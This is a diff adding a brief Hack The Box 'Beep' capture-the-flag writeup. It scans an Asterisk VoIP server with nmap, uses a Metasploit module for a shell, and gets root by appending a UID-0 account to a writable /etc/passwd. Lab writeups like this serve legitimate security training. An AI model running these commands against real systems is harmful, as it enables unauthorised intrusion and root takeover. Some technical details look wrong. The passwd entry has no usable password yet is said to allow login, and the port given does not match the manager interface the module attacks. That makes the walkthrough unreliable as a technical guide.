@@ -1,0 +1,39 @@
+#Hack The Box: "Beep" Challenge Writeup
+#Objective:
+
+Gain access to a vulnerable Asterisk VoIP server and escalate privileges to root.
+
+#Step 1: Scanning the Target
+
+-Scanned the system with nmap to identify open ports:
+
+    'bash
+    'nmap -A -T4 <target_ip>
+
+-Found multiple services, including SSH (port 22), HTTP (port 80), and Asterisk (port 5060).
+
+#Step 2: Exploiting Asterisk VoIP
+
+-Discovered the Asterisk server was running an outdated version that was vulnerable to remote code execution.
+-Used an Asterisk-specific Metasploit module to gain a shell:
+
+    'bash
+    'msfconsole
+    'use exploit/unix/asterisk/manager_exec
+    'set RHOST <target_ip>
+    'exploit
+
+#Step 3: Privilege Escalation
+
+-Enumerated the system for local vulnerabilities and found a writable /etc/passwd file.
+-Added a new root user to the system by editing /etc/passwd:
+
+    'bash
+    'echo 'root2:x:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+-Logged in as the new root user.
+
+#Lessons Learned:
+
+-VoIP servers can be a prime target for attackers due to misconfigurations.
+-Always secure sensitive files like /etc/passwd to prevent unauthorized modification.
